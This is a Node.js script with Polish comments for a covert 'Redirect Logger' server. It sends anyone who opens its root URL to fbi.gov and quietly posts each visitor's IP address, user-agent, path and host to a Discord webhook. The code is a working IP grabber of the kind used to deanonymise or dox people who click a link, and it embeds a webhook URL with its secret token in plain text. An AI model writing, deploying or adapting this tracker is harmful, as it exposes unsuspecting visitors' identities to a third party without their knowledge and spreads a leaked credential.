const https = require('https');
const http = require('http');

// ===== KONFIGURACJA =====
const REDIRECT_URL = 'https://www.fbi.gov/';
const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1478462193635950602/5BBfIfYwu8V9mD2nyARuELThG1Yr2zE_YKmiXvQESarqNIlArqq27f8uXabd8lq7lfuE';
const PORT = 80;
// ========================

// ─── Funkcja wysyłająca embed na Discord webhook ───────────────────────────────
function sendWebhook(embed) {
    const body = JSON.stringify({ embeds: [embed] });
    const url = new URL(WEBHOOK_URL);

    const options = {
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(body),
        },
    };

    const req = https.request(options, (res) => {
        if (res.statusCode !== 204) {
            console.warn(`[Webhook] Odpowiedź: ${res.statusCode}`);
        }
    });

    req.on('error', (err) => {
        console.error('[Webhook] Błąd wysyłania:', err.message);
    });

    req.write(body);
    req.end();
}

// ─── Buduje embed Discorda z informacjami o wizycie ───────────────────────────
function buildEmbed({ ip, method, url, userAgent, host }) {
    const isRedirect = url === '/' || url === '';

    return {
        title: '🌐 Nowe wejście',
        color: isRedirect ? 0x57F287 : 0xED4245,
        fields: [
            { name: '🖥️ IP', value: `\`${ip}\``, inline: true },
            { name: '📄 Ścieżka', value: `\`${url || '/'}\``, inline: true },
            { name: '🔗 Host', value: `\`${host || 'brak'}\``, inline: true },
            { name: '📬 Metoda', value: `\`${method}\``, inline: true },
            { name: '⚡ Akcja', value: isRedirect ? `Redirect → ${REDIRECT_URL}` : '404 Not Found', inline: false },
            { name: '🔍 User-Agent', value: `\`${(userAgent || 'brak').slice(0, 200)}\``, inline: false },
        ],
        footer: { text: 'Redirect Logger' },
        timestamp: new Date().toISOString(),
    };
}

// ─── Serwer HTTP ──────────────────────────────────────────────────────────────
const server = http.createServer((req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
    const url = req.url;
    const method = req.method;
    const userAgent = req.headers['user-agent'];
    const host = req.headers['host'] || '';

    // ⚡ Redirect NATYCHMIAST
    if (url === '/' || url === '') {
        res.writeHead(302, {
            'Location': REDIRECT_URL,
            'Cache-Control': 'no-store, no-cache',
        });
        res.end();
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end('404 - Nie znaleziono');
    }

    // Logi i webhook w tle (po wysłaniu odpowiedzi)
    setImmediate(() => {
        console.log(`[HTTP] ${new Date().toISOString()} | IP: ${ip} | ${method} ${url} | UA: ${userAgent}`);
        sendWebhook(buildEmbed({ ip, method, url, userAgent, host }));
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Serwer nasłuchuje na 0.0.0.0:${PORT}`);
    console.log(`   Redirect: / → ${REDIRECT_URL}`);
});

server.on('error', (err) => {
    if (err.code === 'EACCES') {
        console.error(`❌ Brak uprawnień do portu ${PORT}. Uruchom jako administrator/root.`);
    } else {
        console.error('❌ Błąd serwera:', err.message);
    }
    process.exit(1);
});
